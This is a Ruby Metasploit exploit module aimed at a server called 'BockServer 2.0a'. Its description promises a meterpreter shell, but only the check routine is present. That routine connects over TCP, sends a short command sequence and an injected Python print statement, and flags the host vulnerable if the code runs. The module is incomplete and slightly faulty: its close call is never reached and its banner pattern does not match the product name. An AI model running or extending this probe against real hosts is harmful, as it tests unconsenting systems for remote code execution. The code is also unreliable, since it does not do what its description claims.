require 'socket'
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

    def initialize
        super(
            'Name'           => 'BockServer 2.0a Exploiter',
            'Description'    => 'This module can exploit BockServer 2.0a, creating a meterpreter shell.',
            'DefaultOptions' => { 'RPORT' => 3285 }
            )

        register_options(
            [
              OptString.new('RHOST', [ true, 'Set a remote host' ]),
	      OptString.new('RPORT', [ true, 'Set a remote port' ])
            ], self.class)
    end

    def check
	rhost = datastore['RHOST']
	rport = datastore['RPORT']
	if rhost == nil or rport == nil
            print_error("rhost or rport is not properly configured")
            return
        end
        s = TCPSocket.open(rhost, rport)
	begin
            line = s.gets
	rescue Exception => e
	    s.close()
	    return Exploit::CheckCode::Safe
	end
        if line =~ /BockServe 2.0a/
	    s.send("view",0)
	    2.times{s.gets}
	    
	    s.send("yes",0)
	    2.times{s.gets}
	    s.send("print \"hi\"",0)
	    line = s.gets
	    puts line
	    if line =~ /(python -c)|(hi)/
    	        return Exploit::CheckCode::Vulnerable
	    else
		return Exploit::CheckCode::Safe
	    end
        else 
            return Exploit::CheckCode::Safe
        end
	s.close()	
    end
end

